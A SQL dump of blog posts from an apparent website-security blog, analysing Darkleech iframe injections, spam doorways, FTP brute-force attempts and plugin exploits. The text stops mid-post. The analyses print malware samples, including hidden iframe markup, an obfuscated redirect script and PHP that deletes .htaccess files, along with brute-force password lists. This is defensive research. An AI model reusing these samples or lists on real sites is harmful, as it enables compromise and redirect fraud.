.To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (190, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (191, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (192, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (193, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (194, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (195, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (196, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to 